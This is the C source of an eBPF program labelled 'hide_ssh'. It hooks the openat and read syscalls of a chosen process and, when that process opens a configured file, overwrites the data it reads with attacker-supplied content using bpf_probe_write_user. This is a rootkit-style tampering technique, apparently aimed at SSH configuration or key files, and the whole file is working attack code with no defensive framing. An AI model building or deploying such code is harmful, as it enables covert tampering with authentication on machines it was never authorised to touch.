#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

#define logprefix "hide_ssh: "
#define bpf_printk(fmt, ...)                            \
({                                                      \
        char ____fmt[] = logprefix fmt;                 \
        bpf_trace_printk(____fmt, sizeof(____fmt),      \
                         ##__VA_ARGS__);                \
})

#define filename_len_max 128
#define overwritten_content_len_max 65536

const volatile int target_pid = 0;
const volatile int filename_len = 0;
const volatile char filename[filename_len_max];

const volatile int overwritten_content_len = 0;
const volatile char overwritten_content[overwritten_content_len_max];

struct elem {
    int pid;
    int fd;
    int *buff;
    int buff_len;
};

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 4096);
    __type(key, int); // pid_tgid
    __type(value, struct elem); // elem
} pid_elem SEC(".maps");


SEC("tp/syscalls/sys_enter_openat")
int openat_entrypoint(struct trace_event_raw_sys_enter *ctx)
{
    int tgid = bpf_get_current_pid_tgid();
    int pid = bpf_get_current_pid_tgid() >> 32;
    if (pid != target_pid) {
        return 0;
    }

    char check_filename[filename_len_max];
    bpf_probe_read(&check_filename, filename_len_max, (char*)ctx->args[1]);
    
    for (int i = 0; i < filename_len; i++) {
        if (check_filename[i] != filename[i]) {
            return 0;
        }
    }

    bpf_printk("openat_entrypoint[%d] path: %s\n", pid, ctx->args[1]);
    struct elem value = {
        .pid = pid,
        .fd = ctx->args[0],
        .buff = 0,
        .buff_len = 0
    };
    bpf_map_update_elem(&pid_elem, &tgid, &value, 0);
    return 0;
}

SEC("tp/syscalls/sys_exit_openat")
int openat_exitpoint(struct trace_event_raw_sys_exit *ctx)
{
    int tgid = bpf_get_current_pid_tgid();
    int pid = bpf_get_current_pid_tgid() >> 32;
    if (pid != target_pid) {
        return 0;
    }

    struct elem *fd = bpf_map_lookup_elem(&pid_elem, &tgid);
    if (fd == 0) {
        return 0;
    }
    struct elem *e = fd;
    e->fd = ctx->ret;

    bpf_printk("openat_exitpoint[%d]: fd = %d\n", pid, ctx->ret);
    return 0;
}

SEC("tp/syscalls/sys_enter_read")
int read_entrypoint(struct trace_event_raw_sys_enter *ctx)
{
    int tgid = bpf_get_current_pid_tgid();
    int pid = bpf_get_current_pid_tgid() >> 32;
    if (pid != target_pid) {
        return 0;
    }

    struct elem *e = bpf_map_lookup_elem(&pid_elem, &tgid);
    if (e == 0) {
        return 0;
    }

    if (e->fd != ctx->args[0]) {
        bpf_printk("Error read_entrypoint[%d]: fd: %d != %d\n", pid, e->fd, ctx->args[0]);
        return 0;
    }

    e->buff = ctx->args[1];
    e->buff_len = ctx->args[2];

    bpf_printk("read_entrypoint[%d]: fd = %d, buff_len = %d\n", pid, e->fd, e->buff_len);
    return 0;
}

SEC("tp/syscalls/sys_exit_read")
int read_exitpoint(struct trace_event_raw_sys_exit *ctx)
{
    int tgid = bpf_get_current_pid_tgid();
    int pid = bpf_get_current_pid_tgid() >> 32;
    if (pid != target_pid) {
        return 0;
    }
    if (ctx->ret < 0) {
        return 0;
    }

    struct elem *e = bpf_map_lookup_elem(&pid_elem, &tgid);
    if (e == 0) {
        return 0;
    }
    long ret = bpf_probe_write_user((void*)e->buff, (void*)overwritten_content, overwritten_content_len+1); // +1 for null byte
    
    bpf_printk("read_exitpoint[%d]: fd = %d, buff_len = %d\n", pid, e->fd, e->buff_len);
    bpf_map_delete_elem(&pid_elem, &tgid);
    return 0;
}

char LICENSE[] SEC("license") = "GPL";